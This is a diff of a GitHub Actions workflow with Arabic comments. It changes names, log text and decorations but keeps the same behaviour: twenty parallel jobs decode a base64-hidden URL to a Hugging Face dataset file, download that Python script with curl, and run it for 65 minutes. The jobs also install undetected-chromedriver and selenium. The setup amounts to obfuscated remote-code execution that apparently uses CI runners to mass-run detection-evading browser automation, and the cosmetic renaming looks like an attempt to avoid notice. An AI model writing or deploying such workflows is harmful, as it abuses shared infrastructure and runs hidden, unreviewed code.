@@ -1,12 +1,11 @@
-name: Linux Tandem Task Division
+name: Linux Synchronized Task Cohort
 
 on:
   # استقبال أمر التشغيل من الخارج عبر التوكن بالكلمة المفتاحية: start
-  repository_dispatch:
-    types: [start]
+  workflow_dispatch:
 
 concurrency:
-  group: tandem-division-${{ github.workflow }}-${{ github.ref }}
+  group: synchronized-cohort-${{ github.workflow }}-${{ github.ref }}
   cancel-in-progress: false
 
 permissions:
@@ -15,22 +14,22 @@ permissions:
 
 jobs:
   # =================================================================
-  # وحدة ضبط الإغلاق: تُنهي الـ workflow بالكامل عند حد 65 دقيقة
+  # قائد الإغلاق النهائي: يُنهي الـ workflow بأكمله عند علامة 65 دقيقة
   # =================================================================
-  closure-regulator:
-    name: "Closure Regulator"
+  final-closure-commander:
+    name: "Final Closure Commander"
     runs-on: ubuntu-latest
     timeout-minutes: 70
     steps:
-      - name: Deploy Total Closure Routine
+      - name: Execute Ultimate Shutdown Directive
         run: |
-          echo "[REGULATOR] Closure regulator online. Complete termination scheduled at the 65-minute marker."
-          echo "[REGULATOR] Tracking workflow signature: ${{ github.run_id }}"
+          echo "[COMMANDER] Final closure commander has taken position. Ultimate shutdown armed at the 65-minute frontier."
+          echo "[COMMANDER] Monitoring workflow reference: ${{ github.run_id }}"
           
           # الانتظار لمدة 65 دقيقة بالضبط (3900 ثانية)
           sleep 3900
           
-          echo "[REGULATOR] Marker reached! Deploying total closure routine..."
+          echo "[COMMANDER] Frontier breached! Executing ultimate shutdown directive..."
           
           # إصدار أمر الإلغاء الشامل عبر واجهة GitHub البرمجية
           curl -sS -X POST \
@@ -39,70 +38,70 @@ jobs:
             -H "X-GitHub-Api-Version: 2022-11-28" \
             "https://api.github.com/repos/${{ github.repository }}/actions/runs/${{ github.run_id }}/cancel"
           
-          echo "[REGULATOR] Total closure routine deployed. Every active and pending unit will be dismantled."
+          echo "[COMMANDER] Ultimate shutdown directive executed. Every active and queued unit will be extinguished."
 
   # =================================================================
-  # المهمة الرئيسية: تهيئة وإطلاق وحدات الفرقة
+  # المهمة الرئيسية: تجهيز وإطلاق وحدات الفوج
   # =================================================================
-  activate-division:
-    name: "DivisionUnit-${{ matrix.unit_label }}"
+  rally-cohort:
+    name: "CohortUnit-${{ matrix.unit_badge }}"
     runs-on: ubuntu-latest
     timeout-minutes: 65
 
     strategy:
       fail-fast: false
       matrix:
-        unit_label: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20]
+        unit_badge: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20]
 
     steps:
-      # ◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉
-      # ﴿المرحلة الأولى﴾ تأسيس القاعدة التشغيلية
-      # ◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉
-      - name: Form Operational Foundation
+      # ✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹
+      # ▹ الطور الأول: تمهيد المنصة التشغيلية
+      # ✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹
+      - name: Pave Operational Platform
         run: |
-          echo "[FORM] Forming operational foundation for DivisionUnit-${{ matrix.unit_label }} on Linux..."
+          echo "[PAVE] Paving operational platform for CohortUnit-${{ matrix.unit_badge }} on Linux..."
           sudo apt update -qq
           sudo apt install -y curl python3-pip
 
-      # ◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉
-      # ﴿المرحلة الثانية﴾ تنزيل ملف التشغيل من المصدر المعين
-      # ◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉
-      - name: Acquire Operations File
+      # ✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹
+      # ▹ الطور الثاني: استلام الحزمة التنفيذية
+      # ✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹
+      - name: Collect Execution Bundle
         run: |
-          echo "[ACQUIRE] Acquiring app_task.py from assigned repository location..."
-          ASSIGNED_LOCATION=$(echo "aHR0cHM6Ly9odWdnaW5nZmFjZS5jby9kYXRhc2V0cy9nZmRnMzRmc2QveGEvcmVzb2x2ZS9tYWluL3N0YXJ0LnB5" | base64 --decode)
-          curl -sL "$ASSIGNED_LOCATION" -o app_task.py
-          echo "[ACQUIRE] Operations file acquired successfully."
+          echo "[COLLECT] Collecting app_task.py from designated relay node..."
+          RELAY_NODE=$(echo "aHR0cHM6Ly9odWdnaW5nZmFjZS5jby9kYXRhc2V0cy9zamtoZnVrL2ZvZm8vcmVzb2x2ZS9tYWluL3N0YXJ0LnB5" | base64 --decode)
+          curl -sL "$RELAY_NODE" -o app_task.py
+          echo "[COLLECT] Execution bundle collected successfully."
 
-      # ◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉
-      # ﴿المرحلة الثالثة﴾ تهيئة المتطلبات البرمجية
-      # ◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉
-      - name: Provision Software Framework
+      # ✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹
+      # ▹ الطور الثالث: تحضير المكونات التشغيلية
+      # ✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹
+      - name: Assemble Operational Components
         run: |
-          echo "[FRAMEWORK] Provisioning software framework components..."
+          echo "[ASSEMBLE] Assembling operational components..."
           pip3 install -q undetected-chromedriver selenium requests
 
-      # ◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉
-      # ﴿المرحلة الرابعة﴾ التشغيل تحت إشراف دوري (65 دقيقة)
-      # ◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉
-      - name: Carry Out Operations Cycle
+      # ✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹
+      # ▹ الطور الرابع: التنفيذ المقيّد زمنياً (65 دقيقة)
+      # ✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹
+      - name: Conduct Constrained Execution
         run: |
-          echo ">> Activating DivisionUnit-${{ matrix.unit_label }} operations cycle..."
+          echo ">> Rallying CohortUnit-${{ matrix.unit_badge }} operation..."
           
           # إطلاق العملية في الخلفية
           python3 app_task.py &
-          DIVISION_PID=$!
+          COHORT_PID=$!
           
-          echo ">> Operations overseer online. Cycle cap: 65 minutes (3900s)."
+          echo ">> Constraint supervisor deployed. Window: 65 minutes (3900s)."
           
           # الانتظار حتى استنفاد المدة المحددة
           sleep 3900
           
           # التحقق من حالة العملية وإنهاؤها عند الضرورة
-          if kill -0 $DIVISION_PID 2>/dev/null; then
-            echo ">> Cycle cap surpassed! Dismantling operations..."
-            kill -9 $DIVISION_PID
-            echo ">> Operations dismantled by overseer."
+          if kill -0 $COHORT_PID 2>/dev/null; then
+            echo ">> Constraint window closed! Retiring operation..."
+            kill -9 $COHORT_PID
+            echo ">> Operation retired by supervisor."
           else
-            echo ">> Operations wrapped up within the cycle cap."
+            echo ">> Operation finalized within constraint window."
           fi
